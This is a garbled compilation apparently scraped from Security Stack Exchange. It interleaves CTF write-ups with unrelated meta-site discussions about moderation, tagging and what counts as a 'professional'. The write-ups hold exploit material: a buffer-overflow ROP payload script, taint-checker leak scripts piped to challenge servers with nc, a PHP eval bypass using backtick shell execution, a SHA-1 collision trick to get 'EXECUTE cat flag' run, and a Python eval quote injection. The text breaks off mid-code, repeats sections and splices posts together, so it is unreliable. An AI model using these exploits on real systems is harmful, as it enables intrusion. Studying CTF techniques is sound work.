real_hash[40f5d109272941b79fdf078a0e41477227a9b4047ca068fff6566104302169ce]&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>The passwords are hashed but showing the expected hash in the response is definitely not right. Turns out that the hashing algorithm is SHA256.
Next step is to figure out the original value of the hash. Since hashing algorithms are one way, there's no way to turn back unless we use bruteforce, rainbow tables or just google for websites with huge databases that have done this before. Some sites didn't contain the hash but the following did: <a href=""https://crackstation.net/"" rel=""nofollow noreferrer"">https://crackstation.net/</a> . The original value for hash <code>40f5d109272941b79fdf078a0e41477227a9b4047ca068fff6566104302169ce</code>

<p>The above approach is a bit lame, so let's solve this in another way with <a href=""https://github.com/radare/radare2"" rel=""nofollow noreferrer"">radare2</a>. r2 is a reverse engineering framework, it can be automated with <a href=""https://github.com/radare/radare2-r2pipe"" rel=""nofollow noreferrer"">r2pipe</a>. So I wrote the following script in order to extract the flag from the functions:</p>

<pre><code>import r2pipe

print(""[+] Opening binary..."")
r2 = r2pipe.open(""./adventure"")

print(""[+] Analysing the binary..."")
r2.cmd(""aaa"")

print(""[+] Looping through foo[1-15] functions..."")
flag = ''
for i in range(1, 16):
    print(""[+] Disassembling foo%s function..."" % i)
    instructions = r2.cmdj(""pdj 4 @sym.foo"" + str(i))  # Get first 4 assembled instructions
    opcode = instructions[-1]['opcode'].strip()  # Get last instruction
    character = chr(int(opcode[-4:], 16))  # Convert hex character from opcode to ASCII
    print(""Opcode: "" + opcode + "", chr: "" + character)
    flag += character

print(""flag: "" + flag)
</code></pre>

<p>Here's the script's output:</p>

<h2>Solution:</h2>

<p>We were given an unstripped 32-bit ELF binary:</p>

<pre><code>$ file return 
return: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=5e510acf107cc9f91edd02f76f14598fcb30de6b, not stripped
</code></pre>

<p>First thing to know when pwning a binary is to check the security measures enabled:</p>

<pre><code>$ checksec return 
[*] '/home/vagrant/sharedFolder/ctf/swamp/apprentice_return/return'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>

<p>So the most important thing to keep in mind is that the NX bit is set which stands for <a href=""https://en.wikipedia.org/wiki/NX_bit"" rel=""nofollow noreferrer"">No-eXecutable</a>. Let's open the binary in <a href=""https://binary.ninja/"" rel=""nofollow noreferrer"">Binary Ninja</a>. The main function is quite straightforward, it calls the <code>doBattle()</code> function, after that it prints some text:</p>

<p><a href=""https://i.stack.imgur.com/pagkU.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/pagkU.png"" alt=""main disas""></a></p>

<p>I guess the <code>doBattle()</code> is the function we're supposed to pwn. However, it is worth noticing another interesting function in the functions list called <code>slayTheBeast()</code>:</p>

<p><a href=""https://i.stack.imgur.com/XuHGP.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/XuHGP.png"" alt=""slayTheBeast disas""></a></p>

<p>This function basically <code>cat</code>s the flag for us. Which means we probably need to somehow jump to this function. Let's examine the <code>doBattle()</code> function:</p>

<p><a href=""https://i.stack.imgur.com/NUXY0.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/NUXY0.png"" alt=""doBattle disas""></a></p>

<p>The function prints some text, then reads a max of 50 characters. A weird thing to notice is that it performs a check for the value at offset 42 from the read characters and compares it with <code>0x08048595</code>. This corresponds to the end of the <code>doBattle()</code> function:</p>

<pre><code>0x08048595      leave
0x08048596      ret
</code></pre>

<p>After playing with the binary with gdb, it becomes clear that the <code>doBattle()</code> function suffers from a buffer overflow vulnerability. The offset to overwrite <code>EIP</code> is 42. There was a problem however when using the vanilla ""payload testing"" method: <code>A * 42 + BBBB</code>.</p>

<p>The check mentioned previously will basically let us fail since <code>BBBB</code> translates to <code>0x42424242</code> which is bigger than <code>0x08048595</code>, so I changed the payload to <code>A * 42 + \x01 * 4</code>:</p>

<p><a href=""https://i.stack.imgur.com/Ub8AQ.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Ub8AQ.png"" alt=""testing the payload""></a></p>

<p>After stepping a bit, it seems we're on the right path:</p>

<p><a href=""https://i.stack.imgur.com/5t9Mb.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/5t9Mb.png"" alt=""right offset""></a></p>

<p>Now we need to jump to <code>slayTheBeast()</code> function, however this function resides at address <code>0x080485db</code>. The previously mentioned check will prevent us from jumping to it directly since the address to jump to needs to be smaller than <code>0x08048595</code>. Let's search for some <a href=""https://en.wikipedia.org/wiki/Return-oriented_programming"" rel=""nofollow noreferrer"">ROP gadgets</a> using <a href=""https://github.com/longld/peda"" rel=""nofollow noreferrer"">peda</a>:</p>

<pre><code>gdb-peda$ ropgadget

popret = 0x8048371
pop2ret = 0x804868a
pop4ret = 0x8048688
pop3ret = 0x8048689
addesp_12 = 0x804836e
addesp_16 = 0x8048465
</code></pre>

<p>The <code>ret</code> at <code>0x0804835a</code> will do the job since it's smaller than <code>0x08048595</code> and it will allow us to return/jump to the <code>slayTheBeast()</code> function which will follow right after it. Our final payload will look like this: <code>A * 42 + ret + slayTheBeast</code>. In practice, this simple Python script will do the job:</p>

<pre><code>from struct import pack

payload = 'A' * 42                 # offset
payload += pack('&lt;I', 0x804835a)   # ret gadget to bypass check (addr must be lower than 0x8048595)
payload += pack('&lt;I', 0x080485db)  # slayTheBeast() addr

print payload

What is our definition of an IT Professional?,"<p>I don't think the meaning of the word ""professional"" is relevant here. It can be used in many ways, and we do not need to agree on a definition to use. Just like with any word, you need to pick up the authors intention not only from the dictionary, but also from the context.</p>

<p>Your edit was rejected for two reasons:</p>

<ul>
<li>It was very minor, not really correcting a problem.</li>
<li>It distorted what the person posting the answer wanted to say. The original wording got a message across. You might dislike that message, but then the correct action would be to downvote and/or comment.</li>

What is our definition of an IT Professional?,"<p>I will explain why the definition is applicable, even though I agree with Anders that it is not relevant. We use the same definition used by any modern English dictionary. There is no infosec-specific meaning to the word. Generally, it can mean one of three things (paraphrasing from online dictionaries):</p>

<ol>
<li><p><strong>Partaking in a particular profession for a living.</strong> This simply relies on the definition of ""profession"". Anyone who has a particular profession for a given subject is a professional in that subject. Example: <em>My job is to write malware. I am a professional malware developer.</em></p></li>
<li><p><strong>Partaking in an activity often engaged in by amateurs.</strong> This definition simply differentiates an amateur from someone with more experience, when many amateurs are often engaged in the field. Example: <em>I enjoy playing golf, but I am not a professional golfer.</em></p></li>
<li><p><strong>A way of behaving that gives off an aura of formality.</strong> This may be where you are getting mixed up. Professional in this context means behaving in a way that is respectable, formal, or ethical. Example: <em>You should show professional behavior to your customers.</em></p></li>
</ol>

<p>The ransomware developer is not discussing his behavior. He is stating a fact about his profession. So what is a profession? It turns out it does not require professional <em>behavior</em>:</p>

<ol>
<li><p><strong>Taking vows for a religious community.</strong> Clearly, this is not the definition being used.</p></li>
<li><p><strong>A calling requiring specialized knowledge, often with involving formal education.</strong> This implies expertise. Formal education is not always required, but it is common. A person is more likely to become a professional neuroscientist by going to Stanford than at home.</p></li>
<li><p><strong>The principal vocation of employment.</strong> This does not imply any level of expertise. A person can be a professional janitor as long as it is their primary means of making money.</p></li>
</ol>

<p>It is likely that this person was implying the second definition of <em>profession</em> in order to appear as an expert. This may or may not be true. Perhaps he is highly experienced in evading AV and has a very good understanding of the psychology of ransomware victims, or maybe he's just a hack who can barely write code that doesn't crash when it's run. This is irrelevant however as the third definition of <em>profession</em> is true. If this is the way he makes money as a living, he <em>is</em> a professional. You can argue that his behavior is not very professional, but not that this is not his profession.</p>

<p>So why is <em>expert</em> not a better term? Expert implies, of course, a certain level of expertise. By changing the term to expert, you are implying that the second definition of <em>profession</em> is correct, and that this person has a deep understanding of the field he is in, which may or may not be true. A professional simply has a job, an expert knows their job like the back of their hand.</p>

<p>In the linked question, OP just dropped some code and asked if it's vulnerable. This sounds to me like a blatant <a href=""https://security.meta.stackexchange.com/questions/2191/code-review-deobfuscation-why-is-it-considered-off-topic-here"">request for code review</a> and definitely didn't demonstrate much research effort.</p>

The biometrics tag can be used for biometrics itself which covers anything from biometric authentication to biometric fingerprinting. Since fingerprinting terminology is sometimes a little ambiguous, and people do not always use the correct narrow definitions (for example, OS fingerprinting is often limited to only discovering what class of OS is running and nothing else), having tags for different forms of fingerprinting seems excessive.</p>

"Writeups: PlaidCTF 2018 - Sat, 05 May 2018 at 04:00 UTC, lasts for 36 hours","<h2>macsh (crypto, 125)</h2>

<p>This defines a custom MAC <code>fmac</code> as follows, given a message <code>m</code>, a key <code>k1</code> and a stream <code>S0</code>:</p>

<ul>
<li>Append the length of <code>m</code> formatted as 16 bytes in big-endian order.</li>
<li>Append <em>b</em> = 1–16 copies of the byte <em>b</em> to pad the message to a multiple of 16 bytes.</li>
<li>Xor the padded message with <code>S0</code>.</li>
<li>Encrypt the result with AES-ECB with the key <code>k1</code>.</li>
<li>Xor all the resulting 16-byte blocks.</li>
</ul>

<p>The stream <code>S0</code> is derived from a 128-bit key <code>k0</code> by repeating a sequence of 128 128-bit blocks where block number <code>i</code> is calculated by rotating <code>k0</code> right by <code>i</code> bits.</p>

<p>The MAC function operates by blocks. We don't know how each encrypted block is calculated, but we know that the result depends only on the content of that block in the message and on the block's index modulo 128. In particular, if a block is repeated at a 128*16=2048-byte interval, then the encrypted blocks will be identical. Since the MAC is a xor of all the encrypted blocks, these repeated blocks cancel out.</p>

<p>We can also deduce the MAC of a message with xor equations. Suppose that <code>m1</code> contains some block <code>B1</code> at position <code>i</code>, and <code>m2</code> is the same message except that position <code>i</code> contains <code>B2</code>. Then <code>fmac(m1) xor fmac(m2)</code> depends only on <code>B1</code>, <code>B2</code> and <code>i</code> modulo 128, and not on the rest of the message.</p>

<p>This MAC function is used in a remote shell where we can use the following commands:</p>

<ul>
<li><code>tag tag</code> or <code>tag echo</code>: calculate the <code>fmac</code> of the command line consisting of <code>tag</code> or <code>echo</code> and the given parameters, joined with a single space.</li>
<li><code>pwd</code>, <code>cd</code>, <code>ls</code>, <code>cat</code>: the usual Unix commands, which require a valid <code>fmac</code>. <code>pwd</code> takes no parameters, the others take exactly one parameter.</li>
</ul>

<p>Null bytes are accepted in arguments but not in file names. Whitespace (spaces and bytes 0x09–0x0d) cannot appear in parameters.</p>

<p>Example: to list the current directory, we can run the command <code>ls .</code>, which is padded to the two blocks <code>ls .000000000000</code>, <code>0004CCCCCCCCCCCC</code> where <code>0</code>, <code>4</code> and <code>C</code> are the characters 0x00, 0x04 and 0x0c respectively. To calculate its MAC, we need to craft a message starting with <code>tag</code> and a space (or <code>echo</code> and a space), containing blocks that will cancel out, and containing the two blocks of the <code>ls</code> command at positions 128 and 129 (or 256 and 257, etc.).</p>

<p>Since we can't pass bytes 0x09–0x0d in parameters, we need to fiddle with the length of the command to avoid those bytes both in the encoding of the length and in the padding. The following command lengths are admissible: 0–2, 8, 14–18, 24–31, 33, 34, 40–50, 56–66,  etc. We can always make a command (other than <code>pwd</code>) longer by adding more slashes in a file name (or prepending <code>./</code> if it doesn't contain a slash). For example, instead of <code>ls .</code>, we can use <code>ls .////</code>.</p>

<p>Given a command <code>cmd</code> of admissible length that is less than 2032 bytes, we want the MAC of <code>cmd</code> at position 0. Query the tags of the following messages:</p>

<ul>
<li><code>tag AAA…</code> where <code>AAA…</code> has the same length as <code>cmd</code>.</li>
<li><code>tag BBB…B</code> of length 2048 bytes, then <code>cmd</code> followed by its length padding.</li>
<li><code>tag BBB…B</code> of length 2048 bytes, then <code>tag AAA…</code> followed by its length padding (which is the same as <code>cmd</code>'s).</li>
</ul>

<p>The xor of these three tags is the tag of <code>cmd</code>.</p>

<p>The following program takes a command line as argument, calculates its MAC by sending <code>tag</code> commands as described above, and finally runs the command.</p>

<pre><code>#!/usr/bin/env python3

<p>(Arminius solved it first. I built a slightly different solution as a warm-up to Doggo.)</p>

<p>The server runs an interpreter for a toy language. The language is similar a subset of ML, restricted to expressions involving only the types <code>int</code> and <code>bool</code>, with various syntactic restrictions and only a few predefined operators. You can only execute a single expression per session. You can define functions, but not recursive ones, and there are no loops either.</p>

<p>In addition to ML features, the language has a taint mechanism. Every expression has a secrecy level in addition to its type: public or private. The <code>flag</code> variable is private. The interpreter only prints the value of public expressions. Generally speaking, if an expression involves any private value, its result is private.</p>

<p>The flaw in this interpreter is a classic one: the secrecy of an if-then-else expression depends only on the type of the return expressions, and not on the type of the condition. This allows leaking data one bit at a time.</p>

<p>The flag is encoded as an integer by taking the string's binary representation. We know from <code>run.sml</code> that the flag length is 36 bytes.</p>

<p>The following function takes an argument of the form 2^k and returns 2^k if the flag has bit k set and 0 otherwise.</p>

<pre><code>fn (b : int) =&gt; if flag / b % 2 = 1 then b else 0
</code></pre>

<p>We should be able to get the flag by calling this function 36*8 times and summing up the result.</p>

<pre><code>python -c 'print(""let t = fn (b : int) =&gt; if flag / b % 2 = 1 then b else 0 in t "" + "" + t "".join([str(1 &lt;&lt; i) for i in range(8*6)]))' | nc wolf.chal.pwning.xxx 6808
</code></pre>

<p>However this times out. We need to be more clever. Let's avoid divisions by starting from the highest bit and subtracting in sequence. To make the expression shorter, we use references to keep the current value. This still doesn't work though.</p>

<pre><code>python -c 'print(""let secret = ref flag in let leaked = ref 0 in let t = fn (b : int) =&gt; if !secret &lt; b then () else (secret := !secret - b; leaked := !leaked + b) in t "" + ""; t "".join(reversed([str(1 &lt;&lt; i) for i in range(8*36)])) + ""; !leaked"")' | nc wolf.chal.pwning.xxx 6808

<h2>Doggo (misc, 150)</h2>

<p>This is Pupper with the if flaw fixed.</p>

<p>This doesn't mean that the taint checker is sound, though. As a rule, it's hard to do anything fancy with types when you have both side effects and functions. So let's look for a flaw around those lines.</p>

<p>The taint checker now requires that an if statement with a private condition has branches of private type. Furthermore it analyzes the content of if branches to verify that they don't modify public references. So you can't leak data just by putting <code>leaked := 1 :&gt; private unit</code> in a branch.</p>

<p>But the public reference checker doesn't analyze functions. So all we need to do to hide the leak is to put it inside a function that happens to have a private type. This flaw will remain as long as the type of an assignment is a bare <code>unit</code> regardless of the secrecy of the values involved, or as long as you can hide any assignment behind a semicolon.</p>

<p>Here's the byte extractor script with a modified expression to extract bits:</p>

<pre><code>#!/usr/bin/env python3
import os, re, subprocess, sys

def get_byte(cmd, k):
    expr = '''
    let secret = ref (flag / {} % 256) in
    let leaked = ref 0 in
    let ignore = (fn (bit : int) =&gt; () :&gt; private unit) :&gt; private (int -&gt; private unit) in
    let incr = (fn (bit : int) =&gt; (secret := !secret - bit; leaked := !leaked + bit) :&gt; private unit) :&gt; private (int -&gt; private unit) in
    let test = fn (bit : int) =&gt; (
        (if !secret &lt; bit then ignore else incr) bit
    ) in
    test 128; test 64; test 32; test 16; test 8; test 4; test 2; test 1;
    !leaked'''.format(1 &lt;&lt; (k * 8))
    p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    output = p.communicate(input=expr.encode('ascii'))[0].decode('ascii')
    if p.returncode != 0:
        print('Error with the expression\n{}'.format(expr))
        print(output)
        exit(1)
    return(int(output.split()[0]))

def get_flag(cmd):
    values = [get_byte(sys.argv[1:], k) for k in range(36)]

<h2>Not solved: Woofer (pwnable, 450)</h2>

<p>I'd thought of exploiting a side channel for Pupper and then Doggo and Woofer, but the calculations are very well protected against timing side channels. The bignum calculations are made with <a href=""https://security.stackexchange.com/users/655/thomas-pornin"">Thomas Pornin</a>'s <a href=""https://github.com/pornin/CTTK"" rel=""nofollow noreferrer"">CTTK</a>, so calculations on the flag won't reveal its magnitude. The code executes both branches of an <code>if</code>, so you can't extract a boolean that way.</p>

<p>What I missed is that the program uses hash consing to keep memory consumption down, presumably because the execution of nested branches may generate a lot of data. (I do wonder if this is a genuine concern given the time limits, or just a gimmick to make Woofer solvable.) Hash consing means that whether two branches are executing on the same data is observable through memory consumption. Memory consumption is mostly not observable memory, but it is if the server dies due to heap exhaustion. Therefore, if you carefully tune your expression's memory consumption, <code>f secret_boolean; f (true :&gt; private bool); ()</code> will either crash or not depending on whether <code>secret_boolean</code> is true. I found the solution in <a href=""https://ctftime.org/writeup/9980"" rel=""nofollow noreferrer"">Plaid Parliament of Pwning's writeup</a>.</p>

<h2>Doggo (misc, 150)</h2>

<p>This is Pupper with the if flaw fixed.</p>

<p>This doesn't mean that the taint checker is sound, though. As a rule, it's hard to do anything fancy with types when you have both side effects and functions. So let's look for a flaw around those lines.</p>

<p>The taint checker now requires that an if statement with a private condition has branches of private type. Furthermore it analyzes the content of if branches to verify that they don't modify public references. So you can't leak data just by putting <code>leaked := 1 :&gt; private unit</code> in a branch.</p>

<p>But the public reference checker doesn't analyze functions. So all we need to do to hide the leak is to put it inside a function that happens to have a private type. This flaw will remain as long as the type of an assignment is a bare <code>unit</code> regardless of the secrecy of the values involved, or as long as you can hide any assignment behind a semicolon.</p>

<p>Here's the byte extractor script with a modified expression to extract bits:</p>

<pre><code>#!/usr/bin/env python3
import os, re, subprocess, sys

def get_byte(cmd, k):
    expr = '''
    let secret = ref (flag / {} % 256) in
    let leaked = ref 0 in
    let ignore = (fn (bit : int) =&gt; () :&gt; private unit) :&gt; private (int -&gt; private unit) in
    let incr = (fn (bit : int) =&gt; (secret := !secret - bit; leaked := !leaked + bit) :&gt; private unit) :&gt; private (int -&gt; private unit) in
    let test = fn (bit : int) =&gt; (
        (if !secret &lt; bit then ignore else incr) bit
    ) in
    test 128; test 64; test 32; test 16; test 8; test 4; test 2; test 1;
    !leaked'''.format(1 &lt;&lt; (k * 8))
    p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    output = p.communicate(input=expr.encode('ascii'))[0].decode('ascii')
    if p.returncode != 0:
        print('Error with the expression\n{}'.format(expr))
        print(output)
        exit(1)
    return(int(output.split()[0]))

def get_flag(cmd):
    values = [get_byte(sys.argv[1:], k) for k in range(36)]
    return bytes(reversed(values)).decode('ascii')

if __name__ == '__main__':

<h2>Not solved: Woofer (pwnable, 450)</h2>

<p>I'd thought of exploiting a side channel for Pupper and then Doggo and Woofer, but the calculations are very well protected against timing side channels. The bignum calculations are made with <a href=""https://security.stackexchange.com/users/655/thomas-pornin"">Thomas Pornin</a>'s <a href=""https://github.com/pornin/CTTK"" rel=""nofollow noreferrer"">CTTK</a>, so calculations on the flag won't reveal its magnitude. The code executes both branches of an <code>if</code>, so you can't extract a boolean that way.</p>

<p>What I missed is that the program uses hash consing to keep memory consumption down, presumably because the execution of nested branches may generate a lot of data. (I do wonder if this is a genuine concern given the time limits, or just a gimmick to make Woofer solvable.) Hash consing means that whether two branches are executing on the same data is observable through memory consumption. Memory consumption is mostly not observable memory, but it is if the server dies due to heap exhaustion. Therefore, if you carefully tune your expression's memory consumption, <code>f secret_boolean; f (true :&gt; private bool); ()</code> will either crash or not depending on whether <code>secret_boolean</code> is true. I found the solution in <a href=""https://ctftime.org/writeup/9980"" rel=""nofollow noreferrer"">Plaid Parliament of Pwning's writeup</a>.</p>

<p>You're presented with a website that lets you <code>eval()</code> PHP code. However, the site is protected by a <a href=""http://c67f8ffd.quals2018.oooverflow.io/websec_eval_wl.so"" rel=""nofollow noreferrer"">custom PHP extension</a> that's supposed to restrict <code>eval()</code>, and an <a href=""http://php.net/manual/en/ini.core.php#ini.open-basedir"" rel=""nofollow noreferrer""><code>open_basedir()</code></a> directive.</p>

<p>This means we can't just use...</p>

<pre><code>echo file_get_contents(""/var/www/flag"");
</code></pre>

<p>...because <code>open_basedir()</code> is restricting PHP's access to the <code>/var/www/html</code> directory tree, thus preventing us from reading files at <code>/var/www/</code> directly:</p>

<pre><code>Warning: file_get_contents(): open_basedir restriction in effect. File(/var/www/flag) is not within the allowed path(s): (/var/www/html/) in /var/www/html/index.php(44) : eval()'d code on line 1

Warning: file_get_contents(/var/www/flag): failed to open stream: Operation not permitted in /var/www/html/index.php(44) : eval()'d code on line 1
</code></pre>

<p>Also, the extension seems to prevent us from using functions like <code>shell_exec()</code>. However, we can just take advantage of the <a href=""http://php.net/manual/en/language.operators.execution.php"" rel=""nofollow noreferrer"">backtick execution operator</a>:</p>

<pre><code>echo `/var/www/flag`;
</code></pre>

<p>This immediately works because <code>open_basedir()</code> doesn't extend to shell commands -- which is why I initially used this construct which turned out to be unnecessarily complicated:</p>

<pre><code>echo `sh -c ""/var/www/flag""`;
</code></pre>

<p>You're presented with <a href=""http://5a7f02d0.quals2018.oooverflow.io/"" rel=""nofollow noreferrer"">a website</a> which lets you upload PDF documents and provides two services:</p>

<ul>
<li><p>You can get your uploaded PDF document signed. If the text displayed inside the PDF (it's parsed with OCR) starts with <code>ECHO</code>, it's safe to be signed and you will be given a signature.</p></li>
<li><p>You can get your uploaded PDF executed. If you provide a valid signature for your PDF and its displayed text starts with <code>EXECUTE</code>, the command that follows will be <code>shell_exec()</code>'d.</p></li>
</ul>

<p>So the challenge is to obtain a signature for an innocent-looking PDF (must start with <code>ECHO</code>) but also be able to craft a PDF with the same signature that starts with <code>EXECUTE</code>.</p>

<p>Luckily, the PHP app is using   <a href=""http://php.net/manual/en/function.openssl-sign.php"" rel=""nofollow noreferrer""><code>openssl_sign()</code></a> / <a href=""http://php.net/manual/en/function.openssl-verify.php"" rel=""nofollow noreferrer""><code>openssl_verify()</code></a> which defaults to SHA-1 as <code>signature_alg</code> -- and SHA-1 is well-known to be <a href=""https://shattered.io/"" rel=""nofollow noreferrer"">broken in practice</a>. </p>

<p>Google's collision proof of concept takes advantage of diffferently aligned comment sections inside a JPEG embedded into the PDF document to make both PDFs display different images (which can be freely chosen) <a href=""https://security.stackexchange.com/a/152482/95381"">as explained here</a>. (SHA-1 operates on blocks, so you can append arbitrarily large identical blocks to both PDFs after the collision blocks and always end up with the hashes of both documents colliding.)</p>

<p><img src=""https://shattered.io/static/pdf_format.png"" alt=""Info grahic""></p>

<p>and the other one...</p>

<pre><code>EXECUTE cat flag

<p>Now we just need to have the first innocent one signed, then upload the second one with the signature of the first, which passes the verification and finally yields the flag:</p>

<p>Evidently, the website is detecting the admin's browser as an additional layer of protection. To find out if it's using the <code>User-Agent</code> header to identify the admin, we first try to omit the header completely. With a missing UA we get...</p>

<pre><code>&lt;br /&gt;
&lt;b&gt;Notice&lt;/b&gt;:  Undefined index: HTTP_USER_AGENT in &lt;b&gt;/var/www/html/browsertest.php&lt;/b&gt; on line &lt;b&gt;3&lt;/b&gt;&lt;br /&gt;
</code></pre>

<p>... so some processing of the UA seems to take place.</p>

<p>In order to narrow down what UA the admin may be using, let's have a look at the distinct features the redirecting page is using:</p>

<ul>
<li><p><code>Content-Security-Policy: upgrade-insecure-requests</code></p></li>
<li><p><code>&lt;style scoped&gt;</code></p></li>
<li><p><code>&lt;video autoplay&gt;</code></p></li>
<li><p><code>navigator.battery.charging</code></p></li>
</ul>

<p>The most notable here seems to be <code>&lt;style scoped&gt;</code> which has only been ever inplemented <a href=""https://caniuse.com/#feat=style-scoped"" rel=""nofollow noreferrer"">in Firefox 21-54</a>. Also, <code>upgrade-insecure-requests</code> has been available in Firefox <a href=""https://caniuse.com/#feat=upgradeinsecurerequests"" rel=""nofollow noreferrer"">since version 42</a> and <code>navigator.battery</code> was <a href=""https://developer.mozilla.org/en-US/docs/Web/API/Navigator/battery"" rel=""nofollow noreferrer"">removed</a> in Firefox 50 in favor of the <code>navigator.getBattery()</code> API.</p>

<p>So, we're left with brute-forcing user-agents of Firefox between 42 and 49 with a simple Python script:</p>

<pre><code>import requests
import time

URL = 'http://0da57cd5.quals2018.oooverflow.io/login.php'

for version in range(42, 50):
    user_agent = 'Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/%d.0' % version
    r = requests.post(
        URL,

        headers={'User-Agent': user_agent}
    )
    if ""Incompatible"" not in r.text:
        print(r.text)

<p>Whilst we shouldn't encourage poor questions - if the OP has asked something which is on-topic but then added an additional off-topic question he has still asked a valid question.

Should we have a canonical question tag?,"<p>Let me address the two things in here. </p>

<p>First, we don't really want a list of canonical questions, too hard to maintain as mentioned in previous meta-post <a href=""https://security.meta.stackexchange.com/questions/1673/should-we-work-harder-to-create-canonical-questions"">here</a> and <a href=""https://security.meta.stackexchange.com/questions/1593/would-it-make-sense-to-have-a-curated-list-of-canonical-questions"">here</a>.</p>

<p>Second, <a href=""https://stackoverflow.com/help/tagging"">tags are meant</a> to regroup question about a particular topic. 'canonical questions' are not a security topic, at best it is a meta-topic. </p>

<p>I am therefore strongly opposed to this.</p>

<p>Nevertheless, I'd support the creation of a meta question on 'how to  write/answer a canonical question'. This should include information like, when should we write a CQ, what should be included in my CQ (info banner for example, references, related meta-post).</p>

",<discussion><privacy><hyperlinks><security>,3,,82
Concern: Can users post any image or link while asking questions on site?,"<p>A post on Stack Exchange can contain a link to any website. This is no different from any other website. Like pretty much any website with externally contributed content, even if you trust the site owners, you can't trust all the contributors.</p>

<p>A post on Stack Exchange can embed images. Those images can be hosted on any website. Images are normally not malicious, but this could be a vector for exploits of browser bugs. Today bugs involving JavaScript are much more likely than bugs involving image parsing. Users cannot put custom JavaScript in their posts on most Stack Exchange sites. A few sites (not Security.SE) support <a href=""https://meta.stackexchange.com/tags/stack-snippets/info"">Stack Snippets</a> which allows posts to contain custom JavaScript code. Obviously this code is sandboxed so it shouldn't be harmful barring bugs.</p>

<p>Do note that Stack Exchange posts can embed images that are hosted on external servers. This doesn't make them potentially <em>malicious</em>, but it can be a breach of privacy. If you view a post that embeds an image that is hosted on a third-party server, then the administrator of that server will know that your IP address viewed that image on that date.</p>

<p>In the best case, the answerer will understand and admit the flaw, and will either edit their answer to correct it or delete it.</p>

<p>If the answer is genuinely <em>dangerous</em>, it may be removed by moderators. But the standard for dangerosity is pretty high. “This isn't best practice” is not high enough. “This is mind-bogglingly stupid and may get you hacked” may or may not be.</p>

Are mods have been assigned a specific job in moderating the site?,"<p>Daya - we all have the same role. And that covers the entire site.

<p>I am present in a lot of chat rooms, but that doesn't necessarily mean I am active in the DMZ. I respond to pings for a mod there, and try to keep an eye on it, as do the other mods. And we all respond to flags, which is the main route by which mods become aware of issues that need action.</p>

<p>So don't worry that your observations are misleading.</p>

<p>There are no specific jobs. We're in vastly different timezones, and our activity varies a lot. When we added Schroeder as the most recent mod, our newest friend handles more flags than anybody, so I come here to something quiet and became a much less visible mod. I tent to check in daily, however, and when Schroeder was on vacation there was a lot more visibility from me.</p>

Are mods have been assigned a specific job in moderating the site?,"<h1>pycalx, pycalx2</h1>

<p>We can submit code to evaluate a Python expression, but this expression has to be framed in terms of two values with a binary operator in the middle. More precisely:</p>

<ul>
<li>The values <code>value1</code> and <code>value2</code> are interpreted as strings, except if they consist exclusively of digits, in which case they're interpreted as integers. Each value must consist of 1 to 64 characters.</li>
<li>If one of <code>value1</code> or <code>value2</code> is interpreted as an integer, then the other one must be as well.</li>
<li>The operator <code>op</code> must consist of 1 or 2 characters, the first of which is one of <code>+-/*=!</code>.</li>
<li>The following characters are blacklisted in values: <code>()[]'""</code>. In pycalx2, these characters are also blacklisted in <code>op</code>; this is the only difference between pycalx and pycalx2.</li>
<li><p>The expression is evaluated and printed as follows:</p>

<pre><code>calc_eval = str(repr(value1)) + str(op) + str(repr(value2))
result = str(eval(calc_eval))
if result.isdigit() or result == 'True' or result == 'False':
    print(result)
</code></pre></li>
<li>In other cases, in particular if the result is a string or if the evaluation raises an exception, the program outputs <code>Invalid</code>.</li>
</ul>

<p>We can see the source code by adding the parameter <code>source=1</code> to the URL. The flag is in a variable called <code>FLAG</code>.</p>

<p>Notice that we can access local and global variables, since <code>eval</code> is done in the context of the Python program. The difficulty is that if we don't cheat, <code>value1</code> and <code>value2</code> are literals: we only get to inject their representation as string or integer literals into the expression. There's obviously more freedom with <code>op</code>, but we only really have a single character to play with.</p>

<p>For example, given the inputs <code>value1=hello&amp;op===&amp;value2=world</code>, the server evaluates</p>

<pre><code>'hello'=='world'
</code></pre>

<p>and prints <code>False</code>.</p>

<p>I didn't find a way to construct an integer except by performing operations on integer constants. Therefore I focused on exfiltrating a boolean. Basically, I exfiltrated the value of <code>FLAG &lt;= s</code> for successive values of <code>s</code>, doing a binary search to build <code>s</code> character by character.</p>

<h2>pycalx</h2>

<p>The most obvious way to cheat is a quote injection. Make <code>op</code> a one-character operator followed by <code>'</code>. Then the initial quote from <code>str(repr(value2))</code> closes an empty string literal, and the rest of <code>value2</code> is interpreted as code. There's a trailing single quote at the end, which can be nullified by ending <code>value2</code> with a <code>#</code>.</p>

<p>We'd like to get to evaluate something like <code>'foo'&lt;''+FLAG#'</code> with <code>'foo'</code> from <code>value1</code>, <code>&lt;'</code> from <code>op</code> and <code>'+FLAG#'</code> from <code>value2</code>. This isn't possible because <code>&lt;</code> is not accepted as the first character of <code>op</code>. But we can use <code>+</code> on the other side, and ignore that and construct a boolean on the right-hand side:</p>

<pre><code>'value1'+''and value1&lt;FLAG#'
        ^^
        op
</code></pre>

<p>There's a difficulty with this: the flag turned out to contain some characters that are forbidden in <code>value1</code>. To combat this, I used string formatting to inject special characters with the <code>%</code> operator and the <code>%c</code> specifier. With no tuples, this approach is limited to a single special character at a time. I found a simpler approach for pycalx2, which is to use the <code>source</code> parameter — it's available in the local variable <code>source</code>, and it doesn't get filtered! I didn't realize this until I'd solved pycalx, so here's my script for pycalx.</p>

<h2>pycalx2</h2>

<p>This time the <code>+'</code> trick doesn't work since <code>op</code> isn't allowed to contain <code>'</code>. So how else could we somehow nullify the leading quote of <code>value2</code>, which is the only place where we can act?</p>

